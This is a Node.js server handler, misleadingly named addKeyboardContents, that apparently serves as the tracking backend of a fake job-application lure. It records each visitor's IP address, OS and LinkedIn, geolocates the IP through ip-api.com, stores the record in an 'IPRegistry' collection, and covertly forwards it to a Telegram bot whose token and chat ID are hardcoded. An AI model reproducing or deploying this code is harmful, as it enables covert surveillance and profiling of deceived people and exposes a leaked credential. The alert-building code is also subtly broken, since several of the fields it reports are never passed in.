const { addDoc, collection, doc, Timestamp } = require("firebase/firestore");

// ── Telegram config ────────────────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = "8776922425:AAEuMrcF--3NkV4EO2CdNnSnNLs8qg-0D_c";
const TELEGRAM_CHAT_ID   = "8336389187";

// ── Format timestamp as 2026_06_19_13_34_57 ───────────────────────────────
function fmtTs(date) {
  const pad = n => String(n).padStart(2, "0");
  return [
    date.getUTCFullYear(),
    pad(date.getUTCMonth() + 1),
    pad(date.getUTCDate()),
    pad(date.getUTCHours()),
    pad(date.getUTCMinutes()),
    pad(date.getUTCSeconds()),
  ].join("_");
}

// ── Extract country name from location string ─────────────────────────────
function extractCountry(location) {
  if (!location || location === "Unavailable") return "Unknown";
  const parts = location.split(",");
  return parts[parts.length - 1].trim().replace(/\s+/g, "_");
}

async function sendTelegramAlert(data) {
  const msg = `*OS:* ${data.os} 
*Location:* ${data.location} 
*IP:* ${data.ip}
*LinkedIn:* ${data.linkedin} 
*Name:* ${data.fullName}
*Time:* ${new Date().toLocaleString("en-US", { timeZone: "UTC" })} UTC
*Position:* ${data.position}
*Email:* ${data.email}
*Salary:* ${data.salary ? "$" + data.salary + "/mo" : "—"}
`.trim();

  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id:    TELEGRAM_CHAT_ID,
      text:       msg,
      parse_mode: "Markdown",
    }),
  });
}

// ── Main handler ───────────────────────────────────────────────────────────
async function addKeyboardContents(req, res, db) {
  try {
    const { position, fullName, email, linkedin, salary, os } = req.body;

    const now       = new Date();
    const timestamp = Timestamp.fromDate(now);
    const tsString  = now.toISOString();

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.ip ||
      "Unavailable";

    // ── Geo lookup ──────────────────────────────────────────────────────
    let location = "Unavailable";
    try {
      const r = await fetch(`http://ip-api.com/json/${ip}`);
      const d = await r.json();
      if (d.status === "success") {
        location = `${d.city}, ${d.regionName}, ${d.country}`;
      }
    } catch {}

    // ── Build display name with specific format
    const country = extractCountry(location);
    const safeIP = ip.replace(/\./g, "_").replace(/:/g, "_");

    // Generate displayName with special format if linkedin exists
    let displayName;
    if (linkedin != "unavailable") {
      // Example: 2026_06_23_15_28_22_United_States_134_88_96_241_LK
      displayName = `${fmtTs(now)}_${country}_${safeIP}_LK`;
    } else {
      displayName = `${fmtTs(now)}_${country}_${safeIP}`;
    }

    // Prepare payload for IPRegistry
    const payload = {
      ip,
      location,
      country,
	  linkedin,
      os: os || "",
      latestTs: timestamp,
      displayName,
    };

    // ── 1. Insert into IPRegistry collection (no update, only insert) ─────────────────
    await addDoc(collection(db, "IPRegistry"), payload);

    // ── 2. Telegram alert ───────────────────────────────────────────────
    sendTelegramAlert({ ...payload, timestamp: tsString })
      .catch(err => console.error("Telegram alert failed:", err));

    res.status(200).json({ success: true, displayName });

  } catch (err) {
    console.error("Error adding IPRegistry entry:", err);
    res.status(500).json({ error: "Failed to store IP registry." });
  }
}

module.exports = { addKeyboardContents };